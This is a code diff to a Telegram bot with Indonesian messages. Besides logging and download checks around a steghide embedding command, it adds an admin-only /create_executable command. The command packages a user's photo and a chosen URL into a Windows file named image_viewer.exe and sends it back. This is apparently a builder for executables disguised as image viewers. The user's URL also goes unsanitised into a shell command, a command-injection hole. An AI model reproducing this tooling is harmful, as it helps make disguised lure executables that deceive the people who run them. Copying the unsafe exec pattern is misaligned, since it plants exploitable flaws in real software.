@@ -984,22 +984,29 @@ bot.onText(/\/acc (\d+) (\d+)/, async (msg, match) => {
 });
 
 async function downloadFile(fileLink, filePath) {
-  try {
-    const response = await axios({
-      method: "GET",
-      url: fileLink,
-      responseType: "stream",
-    });
-    const writer = fs.createWriteStream(filePath);
-    response.data.pipe(writer);
-    return new Promise((resolve, reject) => {
-      writer.on("finish", resolve);
-      writer.on("error", reject);
-    });
-  } catch (error) {
-    console.error("Gagal download file:", error);
-    throw error;
-  }
+    console.log(`Mencoba mengunduh dari ${fileLink} ke ${filePath}`);
+    try {
+        const response = await axios({
+            method: "GET",
+            url: fileLink,
+            responseType: "stream",
+        });
+        const writer = fs.createWriteStream(filePath);
+        response.data.pipe(writer);
+        return new Promise((resolve, reject) => {
+            writer.on("finish", () => {
+                console.log(`Berhasil mengunduh file ke ${filePath}`);
+                resolve();
+            });
+            writer.on("error", (err) => {
+                console.error(`Gagal menulis file ke ${filePath}:`, err);
+                reject(err);
+            });
+        });
+    } catch (error) {
+        console.error(`Gagal mengunduh dari ${fileLink}:`, error);
+        throw error;
+    }
 }
 
 bot.onText(/\/upload/, async (msg) => {
@@ -1607,6 +1614,13 @@ bot.on('document', async (msg) => {
             await downloadFile(coverLink, coverPath);
             await downloadFile(embedLink, embedPath);
 
+            if (!fs.existsSync(coverPath) || !fs.existsSync(embedPath)) {
+                bot.sendMessage(chatId, "Gagal mengunduh file yang diperlukan. Silakan coba lagi.");
+                fs.rmSync(tempDir, { recursive: true, force: true });
+                delete userStates[chatId];
+                return;
+            }
+
             // 4. Jalankan perintah steghide
             const command = `steghide embed -cf "${coverPath}" -ef "${embedPath}" -sf "${outputPath}" -p "" -f`;
             exec(command, async (error, stdout, stderr) => {
@@ -1897,6 +1911,60 @@ bot.onText(/\/awan (.+)/, (msg, match) => {
     }
 
     bot.sendMessage(chatId, `🤖 **asisten awan Menjawab:**\n\n${response}`, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/create_executable/, async (msg) => {
+    const chatId = msg.chat.id;
+
+    if (!isAdmin(msg.from.id)) {
+        return bot.sendMessage(chatId, "Anda tidak memiliki izin.");
+    }
+
+    bot.sendMessage(chatId, "Silakan kirim gambar yang ingin Anda gunakan.");
+
+    bot.once("photo", async (photoMsg) => {
+        const photoFileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;
+
+        bot.sendMessage(chatId, "Gambar diterima. Sekarang, kirimkan URL yang ingin Anda buka.");
+
+        bot.once("text", async (urlMsg) => {
+            const url = urlMsg.text;
+            bot.sendMessage(chatId, "URL diterima. Membuat executable, mohon tunggu...");
+
+            const tempDir = path.join(__dirname, 'temp', chatId.toString());
+            if (!fs.existsSync(tempDir)) {
+                fs.mkdirSync(tempDir, { recursive: true });
+            }
+            const imagePath = path.join(tempDir, 'image.jpg');
+            const outputPath = path.join(tempDir, 'image_viewer.exe');
+
+            try {
+                const imageLink = await bot.getFileLink(photoFileId);
+                await downloadFile(imageLink, imagePath);
+
+                if (!fs.existsSync(imagePath)) {
+                    return bot.sendMessage(chatId, "Gagal mengunduh gambar.");
+                }
+
+                const pkgCommand = `pkg -t node16-win-x64 -o "${outputPath}" --options "no-warnings" image_viewer.js -- ${imagePath} ${url}`;
+                exec(pkgCommand, async (error, stdout, stderr) => {
+                    if (error) {
+                        console.error(`Pkg Error: ${stderr}`);
+                        return bot.sendMessage(chatId, "Gagal membuat executable.");
+                    }
+
+                    await bot.sendDocument(chatId, outputPath, {}, {
+                        caption: "Berikut adalah executable Anda."
+                    });
+
+                    fs.rmSync(tempDir, { recursive: true, force: true });
+                });
+            } catch (e) {
+                console.error("Gagal membuat executable:", e);
+                bot.sendMessage(chatId, "Terjadi kesalahan fatal. Silakan coba lagi.");
+            }
+        });
+    });
 });
 
 module.exports = bot;
